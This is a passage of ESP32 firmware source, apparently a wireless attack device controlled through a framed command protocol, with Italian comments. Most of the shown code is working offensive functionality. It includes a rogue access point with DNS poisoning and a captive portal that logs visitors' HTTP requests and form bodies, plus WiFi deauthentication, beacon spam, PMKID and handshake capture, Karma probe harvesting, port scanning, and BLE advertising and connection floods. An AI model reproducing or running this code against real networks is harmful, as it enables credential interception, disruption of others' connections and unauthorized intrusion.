    dnsPoison(q, n, WiFi.softAPIP(), cip, cport);
    return;
  }
  IPAddress up = WiFi.dnsIP();
  if (up == IPAddress(0, 0, 0, 0)) { dnsPoison(q, n, WiFi.softAPIP(), cip, cport); return; }
  dnsUp.beginPacket(up, 53);
  dnsUp.write(q, n);
  dnsUp.endPacket();

  uint16_t id = ((uint16_t)q[0] << 8) | q[1];
  int slot = -1;
  for (int i = 0; i < 8; i++) {
    if (dnsTab[i].used && millis() - dnsTab[i].at > 6000) dnsTab[i].used = false;
    if (!dnsTab[i].used && slot < 0) slot = i;
  }
  if (slot < 0) slot = 0;
  dnsTab[slot].id = id;
  dnsTab[slot].ip = cip;
  dnsTab[slot].port = cport;
  dnsTab[slot].at = millis();
  dnsTab[slot].used = true;
}

// ============ captive portal ============
static void portalTick() {
  if (!rogue) return;
  WiFiClient c = portalSrv.accept();
  if (!c) return;
  uint32_t t0 = millis();
  String head;
  while (c.connected() && millis() - t0 < 2000) {
    while (c.available()) head += (char)c.read();
    if (head.indexOf("\r\n\r\n") >= 0) {
      int clIdx = head.indexOf("Content-Length:");
      if (clIdx < 0) clIdx = head.indexOf("content-length:");
      if (clIdx >= 0) {
        int cl = head.substring(clIdx + 15).toInt();
        if (cl > 0 && cl <= 600) {
          uint32_t t1 = millis();
          while (c.connected() && millis() - t1 < 1500) {
            while (c.available()) head += (char)c.read();
            if ((int)head.length() >= (int)head.indexOf("\r\n\r\n") + 4 + cl) break;
          }
        }
      }
      break;
    }
  }
  int sp = head.indexOf(' ');
  String method = (sp > 0) ? head.substring(0, sp) : "?";
  String path = "";
  if (sp > 0) {
    int sp2 = head.indexOf(' ', sp + 1);
    if (sp2 > sp) path = head.substring(sp + 1, sp2);
  }
  int hi = head.indexOf("Host: ");
  String host = (hi >= 0) ? head.substring(hi + 6, head.indexOf("\r\n", hi)) : "";
  String body = (head.indexOf("\r\n\r\n") >= 0) ? head.substring(head.indexOf("\r\n\r\n") + 4) : "";
  String entry = method + " http://" + host + path;
  if (body.length() > 0 && body.length() < 300) entry += "  [" + body + "]";
  sniffPush("H:" + entry);
  httpCount++;
  Serial.printf("[portal] %s\n", entry.c_str());

  String page = (portalLen > 0) ? String(portalPage) :
    String("<html><body><h2>RHS Portal</h2><p>connessione acquisita dal bridge RedHatSec</p></body></html>");
  String r = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\nContent-Length: ";
  r += page.length(); r += "\r\n\r\n"; r += page;
  c.print(r);
  c.stop();
}

// ============ BT Classic: inquiry + SDP ============
static void btAdd(const uint8_t *bda, const char *name, int rssi) {
  portENTER_CRITICAL(&btMux);
  for (int i = 0; i < btCount; i++) {
    if (!memcmp(btDevs[i].bda, bda, 6)) {
      if (name && name[0]) snprintf(btDevs[i].name, sizeof(btDevs[i].name), "%s", name);
      if (rssi != 0) btDevs[i].rssi = (int8_t)rssi;
      portEXIT_CRITICAL(&btMux);
      return;
    }
  }
  if (btCount < 24) {
    memcpy(btDevs[btCount].bda, bda, 6);
    snprintf(btDevs[btCount].name, sizeof(btDevs[btCount].name), "%s", (name && name[0]) ? name : "");
    btDevs[btCount].rssi = (int8_t)rssi;
    btCount++;
  }
  portEXIT_CRITICAL(&btMux);
}

static void nameFromEir(const uint8_t *eir, int len, char *out, size_t outsz) {
  int i = 0;
  while (i + 2 <= len) {
    int l = eir[i];
    if (l == 0) break;
    if (i + 1 + l > len) break;
    uint8_t t = eir[i + 1];
    if ((t == 0x09 || t == 0x08) && l > 1) {
      int n = l - 1;
      if (n > (int)outsz - 1) n = (int)outsz - 1;
      memcpy(out, eir + i + 2, n);
      out[n] = 0;
      return;
    }
    i += l + 1;
  }
}

static void btGapCb(esp_bt_gap_cb_event_t ev, esp_bt_gap_cb_param_t *p) {
  switch (ev) {
    case ESP_BT_GAP_DISC_RES_EVT: {
      char nm[33] = {0};
      int rssi = 0;
      for (int j = 0; j < p->disc_res.num_prop; j++) {
        esp_bt_gap_dev_prop_t *pr = &p->disc_res.prop[j];
        if (pr->type == ESP_BT_GAP_DEV_PROP_BDNAME && pr->val && pr->len > 0) {
          int n = pr->len > 32 ? 32 : pr->len;
          memcpy(nm, pr->val, n);
          nm[n] = 0;
        } else if (pr->type == ESP_BT_GAP_DEV_PROP_RSSI && pr->val) {
          rssi = *(int *)pr->val;
        } else if (pr->type == ESP_BT_GAP_DEV_PROP_EIR && pr->val && pr->len > 0) {
          if (!nm[0]) nameFromEir((uint8_t *)pr->val, pr->len, nm, sizeof(nm));
        }
      }
      btAdd(p->disc_res.bda, nm, rssi);
      break;
    }
    case ESP_BT_GAP_DISC_STATE_CHANGED_EVT:
      if (p->disc_st_chg.state == ESP_BT_GAP_DISCOVERY_STOPPED) {
        btInq = false;
        btInqDone = true;
        btInqStatus = 0;
      }
      break;
    case ESP_BT_GAP_RMT_SRVCS_EVT: {
      int i = 0, cnt = 0;
      sdpBuf[i++] = 0;
      for (int k = 0; k < p->rmt_srvcs.num_uuids && i < 560; k++) {
        esp_bt_uuid_t *u = &p->rmt_srvcs.uuid_list[k];
        int l = (u->len == ESP_UUID_LEN_16) ? 2 : ((u->len == ESP_UUID_LEN_32) ? 4 : 16);
        if (i + 1 + l > (int)sizeof(sdpBuf)) break;
        sdpBuf[i++] = (uint8_t)l;
        if (l == 2) {
          sdpBuf[i++] = (uint8_t)(u->uuid.uuid16 & 0xFF);
          sdpBuf[i++] = (uint8_t)((u->uuid.uuid16 >> 8) & 0xFF);
        } else if (l == 4) {
          sdpBuf[i++] = (uint8_t)(u->uuid.uuid32 & 0xFF);
          sdpBuf[i++] = (uint8_t)((u->uuid.uuid32 >> 8) & 0xFF);
          sdpBuf[i++] = (uint8_t)((u->uuid.uuid32 >> 16) & 0xFF);
          sdpBuf[i++] = (uint8_t)((u->uuid.uuid32 >> 24) & 0xFF);
        } else {
          memcpy(sdpBuf + i, u->uuid.uuid128, 16);
          i += 16;
        }
        cnt++;
      }
      sdpBuf[0] = (uint8_t)cnt;
      sdpBufLen = i;
      sdpStat = (p->rmt_srvcs.stat == ESP_BT_STATUS_SUCCESS) ? 0 : 2;
      sdpDone = true;
      sdpBusy = false;
      break;
    }
    default:
      break;
  }
}

static void startBtInquiry(int seconds) {
  if (btInq) return;
  portENTER_CRITICAL(&btMux);
  btCount = 0;
  portEXIT_CRITICAL(&btMux);
  btInqDone = false;
  btInqPending = true;
  btInqStatus = 0;
  uint8_t units = (uint8_t)constrain((seconds * 10 + 6) / 13, 1, 48);
  esp_err_t e = esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, units, 0);
  if (e != ESP_OK) {
    btInqPending = false;
    btInqDone = false;
    btInqStatus = 2;
    sendFrame(0x20, 2, (const uint8_t *)"bt off", 6);
    Serial.printf("[bt] inquiry start err=%d\n", (int)e);
  } else {
    btInq = true;
    Serial.printf("[bt] inquiry %ds\n", seconds);
  }
}

static void btTick() {
  if (btInqPending && btInqDone) {
    btInqPending = false;
    uint8_t out[900];
    int i = 0;
    int n = 0;
    portENTER_CRITICAL(&btMux);
    for (int k = 0; k < btCount && i < 860; k++) {
      int nl = strlen(btDevs[k].name);
      if (nl > 32) nl = 32;
      if (i + 8 + nl > 880) break;
      memcpy(out + i, btDevs[k].bda, 6); i += 6;
      out[i++] = (uint8_t)btDevs[k].rssi;
      out[i++] = (uint8_t)nl;
      memcpy(out + i, btDevs[k].name, nl); i += nl;
      n++;
    }
    portEXIT_CRITICAL(&btMux);
    uint8_t payload[900];
    payload[0] = (uint8_t)n;
    memcpy(payload + 1, out, i);
    Serial.printf("[bt] inquiry done: %d\n", n);
    sendFrame(0x20, (uint8_t)btInqStatus, payload, i + 1);
  }
}

// ============ FASE B: BLE offensive (adv flood, conn flood, ATT probe) ============
static bool bleFloodOn = false;
static bool bleFloodRandAddr = true;
static uint32_t bleFloodTicks = 0;
static uint32_t bleFloodLast = 0;
static uint16_t bleGattcIf = 0xFF;
static bool bleGattcReady = false;
static uint8_t bleConnCount = 0;
static uint16_t bleConnIds[8];
static uint32_t bleProbeSent = 0;
static uint32_t bleProbeFail = 0;

static void bleGattcCb(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if, esp_ble_gattc_cb_param_t *param) {
  switch (event) {
    case ESP_GATTC_REG_EVT:
      bleGattcIf = gattc_if;
      bleGattcReady = true;
      Serial.printf("[ble] gattc reg status=%d if=%d\n", param->reg.status, (int)gattc_if);
      break;
    case ESP_GATTC_OPEN_EVT:
      if (param->open.status == ESP_GATT_OK && bleConnCount < 8) {
        bleConnIds[bleConnCount++] = param->open.conn_id;
      }
      Serial.printf("[ble] open status=%d conn_id=%d n=%d\n",
                    param->open.status, param->open.conn_id, bleConnCount);
      break;
    case ESP_GATTC_DISCONNECT_EVT:
      Serial.printf("[ble] disc conn_id=%d reason=0x%02X\n",
                    param->disconnect.conn_id, param->disconnect.reason);
      break;
    default:
      break;
  }
}

static void bleAdvParamsFast(esp_ble_adv_params_t &p, bool randomAddr) {
  memset(&p, 0, sizeof(p));
  p.adv_int_min = 0x20;
  p.adv_int_max = 0x30;
  p.adv_type = ADV_TYPE_IND;
  p.own_addr_type = randomAddr ? BLE_ADDR_TYPE_RANDOM : BLE_ADDR_TYPE_PUBLIC;
  p.peer_addr_type = BLE_ADDR_TYPE_PUBLIC;
  p.channel_map = ADV_CHNL_ALL;
  p.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
}

static bool bleFloodStart(bool randAddr) {
  if (bleFloodOn) return true;
  bleFloodRandAddr = randAddr;
  bleFloodOn = true;
  bleFloodTicks = 0;
  bleFloodLast = 0;
  Serial.printf("[ble] adv flood on rand=%d\n", (int)randAddr);
  return true;
}

// ripristina l'advertising del bridge (FFE0) dopo il flood
static void bleAdvRestore() {
  esp_ble_gap_stop_advertising();
  static const uint8_t adv[] = {0x02, 0x01, 0x06, 0x03, 0x03, 0xE0, 0xFF};
  static const uint8_t rsp[] = {0x0F, 0x09, 'R','e','d','H','a','t','B','r','i','d','g','e','3','2'};
  esp_ble_gap_config_adv_data_raw((uint8_t *)adv, sizeof(adv));
  esp_ble_gap_config_scan_rsp_data_raw((uint8_t *)rsp, sizeof(rsp));
  esp_ble_adv_params_t p;
  bleAdvParamsFast(p, false);
  esp_ble_gap_start_advertising(&p);
}

static void bleFloodStop() {
  if (!bleFloodOn) return;
  bleFloodOn = false;
  bleAdvRestore();
  Serial.printf("[ble] adv flood stop ticks=%lu\n", (unsigned long)bleFloodTicks);
}

static void bleFloodTick() {
  if (!bleFloodOn) return;
  if (millis() - bleFloodLast < 60) return;
  bleFloodLast = millis();
  uint8_t adv[31];
  adv[0] = 0x02; adv[1] = 0x01; adv[2] = 0x06;
  adv[3] = 0x1A; adv[4] = 0xFF;
  for (int i = 5; i < 31; i++) adv[i] = (uint8_t)esp_random();
  esp_ble_gap_stop_advertising();
  if (bleFloodRandAddr) {
    esp_bd_addr_t r;
    r[0] = (uint8_t)(0xC0 | (esp_random() & 0x3F));
    for (int i = 1; i < 6; i++) r[i] = (uint8_t)esp_random();
    esp_ble_gap_set_rand_addr(r);
  }
  esp_ble_gap_config_adv_data_raw(adv, 31);
  esp_ble_adv_params_t p;
  bleAdvParamsFast(p, bleFloodRandAddr);
  esp_ble_gap_start_advertising(&p);
  bleFloodTicks++;
}

static int bleConnect(const uint8_t *mac, uint8_t addrType) {
  if (!bleGattcReady) return -1;
  if (bleConnCount >= 8) return -2;
  esp_bd_addr_t bda;
  memcpy(bda, mac, 6);
  return (int)esp_ble_gattc_open(bleGattcIf, bda, (esp_ble_addr_type_t)addrType, true);
}

static int bleAttProbe(uint8_t count) {
  if (!bleGattcReady || bleConnCount == 0) return -1;
  uint16_t cid = bleConnIds[bleConnCount - 1];
  int sent = 0;
  for (int i = 0; i < count; i++) {
    uint16_t h = (uint16_t)(1 + (esp_random() % 0xFFFE));
    if (esp_ble_gattc_read_char(bleGattcIf, cid, h, ESP_GATT_AUTH_REQ_NONE) == ESP_OK) {
      sent++;
      bleProbeSent++;
    } else {
      bleProbeFail++;
    }
    delay(8);
  }
  return sent;
}

// ============ dispatcher ============
static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
  Serial.printf("[RX] cmd=0x%02X plen=%d\n", cmd, plen);
  switch (cmd) {
    case 0x01:
      sendFrame(0x01, 0x00, (const uint8_t *)"RHS-ESP32", 9);
      break;

    case 0x02: {
      if (capOn) { sendFrame(0x02, 0x03, (const uint8_t *)"sniff active", 12); break; }
      int seconds = plen > 0 ? pl[0] : 8;
      startScan(seconds);
      break;
    }

    case 0x03:
      if (apCount > 0) pollScan();
      else startScan(8);
      break;

    case 0x04:
      if (rogue || capOn) { sendFrame(0x04, 0x03, (const uint8_t *)"radio busy", 10); break; }
      if (plen >= 8) {
        bool ok = sendDeauth(pl, pl[6], pl[7]);
        if (ok) sendFrame(0x04, 0x00, (const uint8_t *)"deauth ok", 9);
        else sendFrame(0x04, 0x02, (const uint8_t *)"tx fail", 7);
      } else {
        sendFrame(0x04, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;

    case 0x05: {
      if (capOn) { sendFrame(0x05, 0x03, (const uint8_t *)"sniff active", 12); break; }
      int p = 0;
      int cnt = plen > 0 ? pl[p++] : 0;
      if (cnt > 16) cnt = 16;
      beaconCount = 0;
      for (int k = 0; k < cnt && p < plen; k++) {
        int sl = pl[p++];
        if (p + sl > plen || sl > 32) break;
        memcpy(beaconSsids[beaconCount], pl + p, sl);
        beaconSsidLens[beaconCount] = sl;
        beaconCount++;
        p += sl;
      }
      if (beaconCount > 0) {
        if (!rogue) setChannel(beaconChannel);
        beaconActive = true;
        Serial.printf("[beacon] armato x%d ch%d\n", beaconCount, rogue ? apChannel : beaconChannel);
        beaconTxOk = 0;
        beaconLoop();
        if (beaconTxOk == 0) {
          beaconActive = false;
          sendFrame(0x05, 0x02, (const uint8_t *)"tx fail", 7);
          Serial.println("[beacon] inject rifiutata dalla radio");
          break;
        }
        sendFrame(0x05, 0x00, (const uint8_t *)"armed", 5);
      } else {
        sendFrame(0x05, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;
    }

    case 0x06:
      if (capOn) { sendFrame(0x06, 0x03, (const uint8_t *)"sniff active", 12); break; }
      if (plen >= 7) {
        karmaArmed = false;
        memcpy(pmkidTarget, pl, 6);
        pmkidTargetCh = pl[6];
        pmkidCaptured = false;
        pmkidLen = 0;
        pmkidArmed = true;
        pmkidStart = millis();
        setChannel(pmkidTargetCh);
        delay(5);
        promiscOn();
        Serial.printf("[pmkid] armed ch%d\n", pmkidTargetCh);
      } else {
        sendFrame(0x06, 0x02, (const uint8_t *)"bad args", 8);
      }
      break;

    case 0x07:
      if (capOn) capStop();
      if (beaconActive) {
        beaconActive = false;
        if (!rogue) setChannel(apChannel);
      }
      if (pmkidArmed) {
        pmkidArmed = false;
        promiscOff();
        setChannel(apChannel);
      }
      if (karmaArmed) {
        karmaArmed = false;
        promiscOff();
      }
      sendFrame(0x07, 0x00, (const uint8_t *)"stopped", 7);
      break;

    case 0x08: {
      if (capOn) { sendFrame(0x08, 0x03, (const uint8_t *)"sniff active", 12); break; }
      int p = 0;
      if (plen < 2) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      int sl = pl[p++];
      if (p + sl > plen || sl > 32) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      char ssid[33]; memcpy(ssid, pl + p, sl); ssid[sl] = 0; p += sl;
      if (p >= plen) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      int pw = pl[p++];
      if (p + pw > plen || pw > 64) { sendFrame(0x08, 0x02, (const uint8_t *)"bad args", 8); break; }
      char pass[65]; memcpy(pass, pl + p, pw); pass[pw] = 0;

      promiscOff();
      beaconActive = false;
      pmkidArmed = false;
      karmaArmed = false;

      WiFi.disconnect(false);
      delay(200);
      WiFi.mode(WIFI_STA);
      staWanted = true;
      WiFi.begin(ssid, pass[0] ? pass : NULL);
      {
        wifi_config_t wc;
        if (esp_wifi_get_config(WIFI_IF_STA, &wc) == ESP_OK) {
          wc.sta.pmf_cfg.capable = true;
          wc.sta.pmf_cfg.required = false;
          esp_wifi_set_config(WIFI_IF_STA, &wc);
        }
      }

      joinTargetSsid = String(ssid);
      joinPending = true;
      joinStart = millis();
      Serial.printf("[join] %s\n", ssid);
      break;
    }

    case 0x10: {
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      int cnt = pl[4];
      if (cnt > 12) cnt = 12;
      uint8_t out[160];
      int oi = 0;
      uint32_t t0 = millis();
      for (int k = 0; k < cnt && millis() - t0 < 12000 && oi < 150; k++) {
        uint16_t port = pl[5 + k * 2] | (pl[6 + k * 2] << 8);
        WiFiClient c;
        if (c.connect(ip, port, 1500)) {
          out[oi++] = port & 0xFF;
          out[oi++] = port >> 8;
          int blIdx = oi++;
          delay(250);
          int bl = 0;
          while (c.available() && bl < 40) { out[oi++] = c.read(); bl++; }
          out[blIdx] = (uint8_t)bl;
          c.stop();
        }
      }
      sendFrame(0x10, 0x00, out, oi);
      break;
    }

    case 0x11: {
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      uint16_t port = pl[4] | (pl[5] << 8);
      int tcs = pl[6];
      int pln = pl[7] | (pl[8] << 8);
      WiFiClient c;
      if (!c.connect(ip, port, 3000)) {
        sendFrame(0x11, 0x01, (const uint8_t *)"conn fail", 9);
        break;
      }
      c.write(pl + 9, pln);
      uint8_t resp[512];
      int rl = 0;
      uint32_t t0 = millis();
      while (millis() - t0 < (uint32_t)tcs * 100 && rl < 512) {
        while (c.available() && rl < 512) resp[rl++] = c.read();
        delay(15);
      }
      c.stop();
      sendFrame(0x11, 0x00, resp, rl);
      break;
    }

    case 0x12: {
      IPAddress ip(pl[0], pl[1], pl[2], pl[3]);
      uint16_t port = pl[4] | (pl[5] << 8);
      int tcs = pl[6];
      int pln = pl[7] | (pl[8] << 8);
      WiFiUDP u;
      u.beginPacket(ip, port);
      u.write(pl + 9, pln);
      u.endPacket();
      uint8_t resp[512];
      int rl = 0;
      uint32_t t0 = millis();
      while (millis() - t0 < (uint32_t)tcs * 100) {
        int ps = u.parsePacket();
        if (ps > 0) {
          while (u.available() && rl < 512) resp[rl++] = u.read();
          break;
        }
        delay(20);
      }
      u.stop();
      sendFrame(0x12, rl > 0 ? 0x00 : 0x01, resp, rl);
      break;
    }

    case 0x13: {  // rogueStart
      if (capOn) { sendFrame(0x13, 0x03, (const uint8_t *)"sniff active", 12); break; }
      if (plen < 2) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
      if (WiFi.status() != WL_CONNECTED) { sendFrame(0x13, 0x02, (const uint8_t *)"sta down", 8); break; }
      int p = 0;
      int sl = pl[p++];
      if (p + sl > plen || sl > 32) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
      memcpy(rogueSsid, pl + p, sl); rogueSsid[sl] = 0; p += sl;
      int pw = 0;
      if (p < plen) pw = pl[p++];
      if (p + pw > plen || pw > 64) { sendFrame(0x13, 0x02, (const uint8_t *)"bad args", 8); break; }
      if (pw > 0 && pw < 8) { sendFrame(0x13, 0x02, (const uint8_t *)"pass 8-64", 9); break; }
      memcpy(roguePass, pl + p, pw);
      roguePass[pw] = 0;
      p += pw;
      dnsFwd = p < plen ? pl[p] != 0 : true;

      promiscOff();
      karmaArmed = false;
      beaconActive = false;
      pmkidArmed = false;

      WiFi.mode(WIFI_AP_STA);
      delay(50);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                        IPAddress(255, 255, 255, 0));
      if (!WiFi.softAP(rogueSsid, pw ? roguePass : NULL, apChannel)) {
        sendFrame(0x13, 0x02, (const uint8_t *)"softAP fail", 11);
        break;
      }
      delay(300);
      dnsSrv.stop();
      dnsSrv.begin(53);
      dnsUp.stop();
      dnsUp.begin(0);
      portalSrv.stop();
      portalSrv.begin();
      for (int i = 0; i < 8; i++) dnsTab[i].used = false;
      rogue = true;
      sniffCount = 0;
      naptOn();
      Serial.printf("[rogue] %s ch%d dns=%s heap=%d\n", rogueSsid, apChannel,
                    dnsFwd ? "hybrid" : "poison", ESP.getFreeHeap());
      sendFrame(0x13, 0x00, nullptr, 0);
      break;
    }

    case 0x14: {
      rogue = false;
      dnsFwd = false;
      for (int i = 0; i < 8; i++) dnsTab[i].used = false;
      sniffCount = 0;
      dnsSrv.stop();
      dnsUp.stop();
      portalSrv.stop();
      naptOff();
      WiFi.softAPdisconnect(true);
      delay(200);
      WiFi.mode(WIFI_STA);
      staWanted = true;
      staBeginPmf();
      Serial.println("[rogue] stop → STA");
      sendFrame(0x14, 0x00, nullptr, 0);
      break;
    }

    case 0x15: {
      if (!rogue) { sendFrame(0x15, 0x02, (const uint8_t *)"rogue off", 9); break; }
      uint8_t buf[113];
      int cnt = apClientList(buf, 104);
      uint8_t out[113];
      out[0] = (uint8_t)cnt;
      memcpy(out + 1, buf, cnt * 10);
      sendFrame(0x15, 0x00, out, cnt * 10 + 1);
      break;
    }

    case 0x16: {
      if (plen < 1) { sendFrame(0x16, 0x02, (const uint8_t *)"bad args", 8); break; }
      if (pl[0]) {
        pmkidArmed = false;
        karmaArmed = true;
        probeCount = 0;
        promiscOn();
        Serial.println("[karma] armed");
        sendFrame(0x16, 0x00, nullptr, 0);
      } else {
        karmaArmed = false;
        promiscOff();
        String csv;
        for (int k = 0; k < probeCount; k++) {
          if (k) csv += ",";
          csv += probeSsids[k];
        }
        sendFrame(0x16, 0x00, (const uint8_t *)csv.c_str(), csv.length());
      }
      break;
    }

    case 0x17: {
      if (plen < 2) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
      int l = pl[0] | (pl[1] << 8);
      if (2 + l > plen || l > 800) { sendFrame(0x17, 0x02, (const uint8_t *)"bad args", 8); break; }
      memcpy(portalPage, pl + 2, l);
      portalPage[l] = 0;
      portalLen = l;
      sendFrame(0x17, 0x00, nullptr, 0);
      break;
    }

    case 0x18: {
      if (plen < 2) { sendFrame(0x18, 0x02, (const uint8_t *)"bad args", 8); break; }
      if (pl[0]) naptOn(); else naptOff();
      dnsFwd = pl[1] != 0;
      for (int i = 0; i < 8; i++) dnsTab[i].used = false;
      sendFrame(0x18, 0x00, nullptr, 0);
      break;
    }

    case 0x19: {
      String csv;
      for (int k = 0; k < sniffCount; k++) {
        if (k) csv += "|";
        csv += sniffLog[k];
      }
      if (csv.length() == 0) {
        wifi_sta_list_t list;
        memset(&list, 0, sizeof(list));
        esp_wifi_ap_get_sta_list(&list);
        char diag[80];
        snprintf(diag, sizeof(diag), "# idle dns=%lu http=%lu clients=%d rogue=%d",
                 (unsigned long)dnsCount, (unsigned long)httpCount,
                 rogue ? (int)list.num : 0, rogue ? 1 : 0);
        csv = diag;
      }
      sendFrame(0x19, 0x00, (const uint8_t *)csv.c_str(), csv.length());
      break;
    }

    case 0x20: {
      int seconds = plen > 0 ? pl[0] : 10;
      if (seconds < 2) seconds = 2;
      if (seconds > 15) seconds = 15;
      if (btInq) { sendFrame(0x20, 0x03, (const uint8_t *)"busy", 4); break; }
      startBtInquiry(seconds);
      break;
    }

    case 0x21: {
      if (plen < 6) { sendFrame(0x21, 0x02, (const uint8_t *)"bad args", 8); break; }
      if (sdpBusy) { sendFrame(0x21, 0x03, (const uint8_t *)"busy", 4); break; }
      esp_bd_addr_t bda;
      memcpy(bda, pl, 6);
      sdpDone = false;
      sdpBusy = true;
      sdpBufLen = 0;
      sdpStat = 0;
      sdpStartMs = millis();
      esp_err_t e = esp_bt_gap_get_remote_services(bda);
      if (e != ESP_OK) {
        sdpBusy = false;
        sendFrame(0x21, 0x02, (const uint8_t *)"sdp fail", 8);
      }
      break;
    }

    case 0x22: {  // BLE adv scan → lista pacchetti
      int seconds = plen > 0 ? pl[0] : 6;
      if (seconds < 2) seconds = 2;
      if (seconds > 15) seconds = 15;
      BLEScan *scan = BLEDevice::getScan();
      scan->setActiveScan(true);
      scan->setInterval(100);
      scan->setWindow(99);
      scan->clearResults();
      BLEScanResults *res = scan->start(seconds, false);
      uint8_t out[900];
      int i = 0, n = 0;
      int found = res ? res->getCount() : 0;
      for (int k = 0; k < found && i < 860; k++) {
        BLEAdvertisedDevice dev = res->getDevice(k);
        String macs = dev.getAddress().toString();
        uint8_t mac[6] = {0};
        int mi = 0;
        for (int c = 0; c < (int)macs.length() && mi < 6; c++) {
          if (macs[c] == ':') continue;
          if (c + 1 < (int)macs.length()) {
            mac[mi++] = (uint8_t)strtoul(macs.substring(c, c + 2).c_str(), nullptr, 16);
            c++;
          }
        }
        String nm = dev.haveName() ? dev.getName() : String();
        int nl = nm.length(); if (nl > 32) nl = 32;
        const uint8_t *pl2 = dev.getPayload();
        int al = dev.getPayloadLength();
        if (al > 48) al = 48;
        if (i + 8 + nl + 1 + al > 900) break;
        memcpy(out + i, mac, 6); i += 6;
        out[i++] = (uint8_t)(int8_t)dev.getRSSI();
        out[i++] = (uint8_t)nl;
        memcpy(out + i, nm.c_str(), nl); i += nl;
        out[i++] = (uint8_t)al;
        if (pl2 && al > 0) { memcpy(out + i, pl2, al); i += al; }
        n++;
      }
      scan->clearResults();
      uint8_t payload[900];
      payload[0] = (uint8_t)n;
      memcpy(payload + 1, out, i);
      Serial.printf("[ble] adv %d\n", n);
      sendFrame(0x22, 0x00, payload, i + 1);
      break;
    }

    case 0x30: {  // sniff start: [hop] (0 = canale fisso)
      if (pmkidArmed || karmaArmed || beaconActive) {
        sendFrame(0x30, 0x03, (const uint8_t *)"busy", 4);
        break;
      }
      bool hop = plen > 0 ? pl[0] != 0 : true;
      if (!capStart(hop)) { sendFrame(0x30, 0x03, (const uint8_t *)"busy", 4); break; }
      sendFrame(0x30, 0x00, (const uint8_t *)"armed", 5);
      break;
    }

    case 0x31: {  // sniff stop → statistiche
      capStop();
      uint8_t out[10];
      out[0] = (uint8_t)capSesCount;
      out[1] = capFrames & 0xFF; out[2] = (capFrames >> 8) & 0xFF;
      out[3] = (capFrames >> 16) & 0xFF; out[4] = (capFrames >> 24) & 0xFF;
      out[5] = capEapol & 0xFF; out[6] = (capEapol >> 8) & 0xFF;
      out[7] = (capEapol >> 16) & 0xFF; out[8] = (capEapol >> 24) & 0xFF;
      out[9] = capCh;
      sendFrame(0x31, 0x00, out, 10);
      break;
    }

    case 0x32: {  // dump handshake idx → [bssid6][sta6][pmkid?+16][ssidLen][ssid][n][msg+len16+frame]...
      int idx = plen > 0 ? pl[0] : 0;
      if (idx < 0 || idx >= capSesCount) { sendFrame(0x32, 0x01, (const uint8_t *)"end", 3); break; }
      uint8_t out[2000];
      portENTER_CRITICAL(&capMux);
      int n = capBuildDump(idx, out, sizeof(out));
      portEXIT_CRITICAL(&capMux);
      if (n <= 0) { sendFrame(0x32, 0x02, (const uint8_t *)"bad idx", 7); break; }
      sendFrame(0x32, 0x00, out, n);
      break;
    }

    case 0x33: {  // stats live
      uint8_t out[10];
      out[0] = (uint8_t)capSesCount;
      out[1] = capFrames & 0xFF; out[2] = (capFrames >> 8) & 0xFF;
      out[3] = (capFrames >> 16) & 0xFF; out[4] = (capFrames >> 24) & 0xFF;
      out[5] = capEapol & 0xFF; out[6] = (capEapol >> 8) & 0xFF;
      out[7] = (capEapol >> 16) & 0xFF; out[8] = (capEapol >> 24) & 0xFF;
      out[9] = capCh;
      sendFrame(0x33, 0x00, out, 10);
      break;
    }

    case 0x40: {  // ble adv flood [on][rand]
      bool on = plen > 0 ? pl[0] != 0 : true;
      if (on) {
        bool r = plen > 1 ? pl[1] != 0 : true;
        bleFloodStart(r);
        sendFrame(0x40, 0x00, (const uint8_t *)"flood on", 8);
      } else {
        bleFloodStop();
        sendFrame(0x40, 0x00, (const uint8_t *)"flood off", 9);
      }
      break;
    }

    case 0x41: {  // conn flood [mac6][addrType][count]
      if (plen < 8) { sendFrame(0x41, 0x02, (const uint8_t *)"bad args", 8); break; }
      uint8_t n = pl[7] == 0 ? 1 : pl[7];
      int ok = 0;
      int lastRc = 0;
      for (uint8_t i = 0; i < n; i++) {
        lastRc = bleConnect(pl, pl[6]);
        if (lastRc == 0) ok++;
        delay(30);
      }
      uint8_t out[4] = {(uint8_t)ok, bleConnCount,
                        (uint8_t)(lastRc & 0xFF), (uint8_t)((lastRc >> 8) & 0xFF)};
      sendFrame(0x41, ok ? 0x00 : 0x02, out, 4);
      break;
    }

    case 0x42: {  // att probe [count]
      int sent = bleAttProbe(plen > 0 ? pl[0] : 8);
      uint8_t out[2] = {(uint8_t)(sent < 0 ? 0 : sent), bleConnCount};
      sendFrame(0x42, sent < 0 ? 0x02 : 0x00, out, 2);
      break;
    }

    case 0x43: {  // storm stop
      bleFloodStop();
      sendFrame(0x43, 0x00, (const uint8_t *)"stopped", 7);
      break;
    }

    default:
      sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
  }
}

static void feedRx(const uint8_t *d, int n) {
  for (int i = 0; i < n; i++) {
    if (rxLen == 0 && d[i] != 0xA5) continue;
    if (rxLen < (int)sizeof(rxBuf)) rxBuf[rxLen++] = d[i];
    if (rxLen >= 6) {
      int plen = rxBuf[1] | (rxBuf[2] << 8);
      if (plen > 400) {  // header spurio: risincronizza sul prossimo 0xA5
        rxLen = 0;
        continue;
      }
      int total = 6 + plen;
      if (rxLen >= total) {
        uint8_t cmd = rxBuf[4];
        if (plen <= (int)sizeof(rxBuf) && crc8(rxBuf + 1, 4 + plen) == rxBuf[5 + plen]) {
          dispatchCmd(cmd, rxBuf + 5, plen);
        } else {
          sendFrame(cmd, 0x01, (const uint8_t *)"crcerr", 6);
        }
        rxLen = 0;
      }
    }
  }
